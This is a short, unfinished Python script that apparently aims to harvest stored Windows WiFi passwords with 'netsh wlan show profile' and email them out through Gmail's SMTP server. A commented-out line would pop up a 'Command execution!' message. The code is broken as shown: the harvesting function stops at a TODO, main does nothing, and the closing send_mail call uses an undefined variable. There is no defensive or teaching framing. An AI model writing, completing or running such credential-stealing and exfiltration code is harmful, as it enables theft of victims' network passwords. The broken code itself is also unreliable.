#!/usr/bin/env python3
import subprocess
import smtplib
import re


def main():
    pass


# Google's smtp is public for use.
def send_mail(email: str, password: str, message: str) -> None:
    server = smtplib.SMTP("smtp.gmail.com", port=587)
    server.starttls()
    server.login(user=email, password=password)
    server.sendmail(from_addr=email, to_addrs=email, msg=message)
    server.quit()


def get_wifi_passwords():
    """Windows only, search and grab clear-text WiFi passwords."""
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)
    network_names = re.findall(r"(?:Profile\s*:\s)(.*)", networks)
    # TODO: Finish this crap.


# For 32 bit. For 64 bit can just do "msg * Command execution!"
# command = "%SystemRoot%\\Sysnative\\msg.exe *  Command execution!"
# subprocess.Popen(command, shell=True)

# Less secure apps needs to be on for gmail.
send_mail('somegmail@gmail.com', 'passwordhere', str(result))
